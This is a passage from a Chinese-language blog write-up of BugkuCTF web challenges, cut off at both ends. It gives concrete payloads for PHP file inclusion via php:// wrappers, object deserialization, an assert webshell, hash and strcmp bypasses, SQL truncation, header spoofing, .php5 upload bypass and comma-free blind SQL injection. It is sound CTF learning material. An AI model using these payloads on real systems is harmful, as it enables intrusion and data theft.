</span></span><br><span class="line"><span class="string">function OutWord()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">var NewWords;</span></span><br><span class="line"><span class="string">NewWords = unescape(Words);</span></span><br><span class="line"><span class="string">document.write(NewWords);</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">OutWord();</span></span><br></pre></td></tr></table></figure>
<p>（3）紧接着进行代码审计，关键是要传参满足下面这些条件：</p>
<pre><code>1.$data==&quot;bugku is a nice plateform!&quot; 
2.$id==0
3.strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)  and substr($b,0,1)!=4
</code></pre>
<p>第一个条件：根据前面的<code>$data = @file_get_contents($a,&#39;r&#39;)</code>判断是文件包含，包含的文件里要有<code>bugku is a nice plateform!</code>，可以利用<code>php://input</code>伪协议即可，不了解的可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539">CTF中文件包含漏洞总结</a><br>构造的payload为：<code>?a=php://input</code>，并再post里传入：<code>bugku is a nice plateform!</code></p>
<p>第二个条件简单，<code>if(!$_GET[&#39;id&#39;])</code>限制了id必须非0，但由于后面判断的时候用的是松散比较比较<code>==</code>，<code>$id</code> 若想满足非空非零且弱等于整型数 0，则 <code>$id</code> 的值只能为非空非零字符串，这里假设 ，因此我这里构造：<code>?id=qwe</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190307202656683.png" alt="在这里插入图片描述"></p>
<p>第三个条件就是对<code>$b</code>的构造，有下面三个条件:</p>
<ul>
<li>b的长度要大于5</li>
<li>1114要和111加上b的第一位匹配</li>
<li>b的第一位不等于4<br>因为再php正则表达实里<code>.</code>(点号)，可以作为通配符，因此这里可构造b的第一位为点号，然后在任意构造大于5位的数字即可，如：<code>b=.123456</code></li>
</ul>
<p>因此综上所述，最终构造的payload为：<code>?id=qwe&amp;a=php://input&amp;b=.1234567</code>，并且在post里传入：<code>bugku is a nice plateform!</code><br>这里直接用浏览器的话，会看到flag一闪而过，可以用burpsuite抓包就行了。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190307203416297.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a>welcome to bugku</h4><p>（1）先看源码，看到注释里给了一段代码：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190307204153152.png" alt="在这里插入图片描述"><br>用到了<code>php://input</code>和<code>php://filte</code>伪协议，不清楚的可以看我之前一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539">CTF中文件包含漏洞总结</a><br>构造的payload：<code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>，并在post里传入：<code>welcome to the bugkuctf</code>，得到一段base64<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190307204259721.png" alt="在这里插入图片描述"><br>（2）将得到base64解码得到下面<code>hint.php</code>的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>再按照第一步的方法尝试包含<code>flag.php</code>的内容，但是得到一串中文乱码，于是再尝试包含<code>index.php</code>文件，base64解码后得到如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>进行代码审计，是一道php反序列化的题:</p>
<ul>
<li><p>首先<code>file</code>不能包含<code>flag</code>，否则就直接退出了，当<code>file</code>不包含<code>flag</code>时，就包含这个文件，并且将<code>password</code>反序列化再输出。</p>
</li>
<li><p>这里看到了反序列化，又想到了刚才的<code>Flag()</code>，显然这里要<code>file=hint.php</code>，将<code>Flag()</code>包含进来。</p>
</li>
<li><p><code>__tostring()</code>函数在直接输出<code>Flag</code>类的对象引用时会被自动调用，并且如果<code>file</code>存在就输出<code>file</code>文件中的内容，显然这里就是我们得到<code>flag.php</code>中内容的途径。</p>
</li>
<li><p>这里看到<code>echo $password;</code>，因此要再<code>password</code>中传入<strong>序列化</strong>过后的<code>Flag</code>类的一个对象，并且它的<code>file</code>属性要为<code>flag.php</code>，这样在<code>Flag</code>类执行<code>__tostring()</code>时就会包含它，可以写如下脚本来得到payload：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="comment">//根据Flag类以及提示，file应该构造为flag.php</span></span><br><span class="line"><span class="variable">$password</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的运行的结果为：<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>因此最终构造的payload为：<code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190307213228898.png" alt="?"><br><br></p>
<h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><p>题目里给出了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; </span><br><span class="line">	<span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);  	</span><br><span class="line">	<span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; </span><br><span class="line">	<span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>构造payload：<code>?s=print_r(scandir(&#39;./&#39;));</code>扫描目录，读取flag_sm1skla1.txt</p>
<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>keykeyxxxxxkey:/x/keya,</span><br></pre></td></tr></table></figure>
<p>匹配正则表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key  -&gt;  key</span><br><span class="line">.*  -&gt;  .代表通配符，*指匹配0次或多次，所以也可以不进行匹配</span><br><span class="line">key  -&gt;  key</span><br><span class="line">.&#123;4,7&#125;  -&gt;  匹配任意字符4-7次，这里用xxxxx匹配</span><br><span class="line">key:\/.\/  -&gt;  key/x/</span><br><span class="line">(.*key)  -&gt; key</span><br><span class="line">[a-z]  -&gt; a</span><br><span class="line">[[:punct:]]  -&gt; 指匹配任意标点，这里用,匹配</span><br></pre></td></tr></table></figure>
<p>因此最终构造的payload：<code>?id=keykeyxxxxxkey:/x/keya,</code></p>
<br>

<h4 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h4><p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很常见的一个md5绕过（这里0e开头绕过以及数组绕过都可以），以及<code>strcmp()</code>函数的漏洞，即当传入的参数为数组时，会报错并且<code>return 0</code></p>
<p>可参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/6687199.html">PHP渗透中的奇淫技巧–检查相等时的漏洞</a></p>
<p>最终构造的payload：<code>?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></p>
<br>

<h4 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h4><p>SQL约束攻击，原理可以参考这篇文章：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/124537.html">基于约束的SQL攻击</a></p>
<p>注册，用户名为admin加许多空格再加一个任意字符，如：</p>
<pre><code>admin                                                                                                        123
</code></pre>
<p>密码可以任意设置<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308202627201.png" alt="在这里插入图片描述"><br>然后再返回登陆页面，使用<code>admin</code>的用户名，和刚才自己设置的密码，即可用<code>admin</code>的账号登陆。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308202901732.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>进入页面后看到”are you from google?”，一开始以为是指伪装成谷歌浏览器访问，后来发现是构造http的Refere，如下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308204958633.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><p>由题目可以知道为MD5碰撞，想到0e开头的md5，因此构造payload：</p>
<pre><code>?a=s878926199a
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308205346629.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><p>题目要求从本地访问，因此直接抓包构造：<code>X-Forwarded-For: 127.0.0.1</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308205549236.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h4><p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>（1）要求<code>uname</code>和<code>passwd</code>不同，但<code>sha1</code>加密后相等，可以利用数组绕过，这里还要注意<code>uname</code>通过GET传入，而<code>passwd</code>是通过POST传入。<br>（2）要求传入的<code>id=margin</code>，但是再判断前先通过<code>urldecode()</code>进行了解码，因此在传的时候要将<code>margin</code>中的任意字符<code>urlencode</code>后再传入。（这里将<code>m</code>编码为<code>%6D</code>）</p>
<p>最终构造的payload：<code>?uname[]=1&amp;id=%6Dargin</code>  ，post中传入：<code>passwd[]=2</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308210639235.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fn</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要传入<code>$ac</code>和<code>$fn</code>两个参数，且包含的文件名即为去除空格后<code>$fn</code>的值，要输出flag，还要满足传入的<code>$ac</code>的值与包含的文件中内容相等，想到利用<code>php://input</code>伪协议。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308211403691.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h4><p>访问<code>robots.txt</code>发现有<code>resusl.php</code>页面：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308211850282.png" alt="在这里插入图片描述"><br>访问该页面，看到页面后面有一个<code>?x=a</code>，又想到题目中的“想办法变成admin”，因此构造payload：<code>?x=admin</code>，得到flag<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308212113963.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="求getshell"><a href="#求getshell" class="headerlink" title="*求getshell"></a>*求getshell</h4><p>（1）题目要求上传一个图片，不能上传php文件，那么解法肯定就是要成功上传一个php文件。</p>
<p>（2）我上传了一个后缀为.jpg的文件，然后上传的时候抓包。</p>
<p>（3）这里有两个需要绕过的点</p>
<ul>
<li>把请求头里面的<code>Content-Type</code>部分字母改成大写进行绕过 </li>
<li>后缀改为<code>.php5</code>（其他的都被过滤了）<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190308213518597.png" alt="在这里插入图片描述"><br>
# **INSERT INTO注入
题目给出了源码：
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip_arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip_arr</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to connect&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to select database&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your ip is :&#x27;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into client_ip (ip) values (&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
简单分析得其是读取HTTP头部`X-Forwarded-For`作为ip地址，在将其传给$ip之前，以 `,` 为分割符进行分割并取结果数组的第一项。</li>
</ul>
<p>这里要注入的语句为:</p>
<pre><code>insert into client_ip (ip) values (&#39;$ip&#39;)
</code></pre>
<p> <strong>在<code>insert into</code>语句里要嵌套执行其他语句时，需要用将字符串与要执行的语句通过<code>+</code>来连接，例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into admin(id,username,password) values(1,1,&#x27;&#x27;+(select sleep(3)));</span><br><span class="line">Query OK, 1 row affected (3.04 sec)</span><br></pre></td></tr></table></figure>
<p>还有这里过滤了逗号，所以要注意以下几点：</p>
<ul>
<li>采取时间盲注时不能用<code>if(cond,expr1,expr2)</code>语句，可以用<code>case...when...then</code>语句代替。</li>
<li>常用的形式截取字符串函数<code>substr([str],[from],[len])</code>由于包含逗号也要用<code>substr([str] from [from] for [len])</code>来代替。</li>
<li>如有需要，可以用<code>limit [len] offset [offset]</code>代替 <code>limit [offset],[len]</code>。</li>
</ul>
<p>综上，最后写出的python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">dic = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span 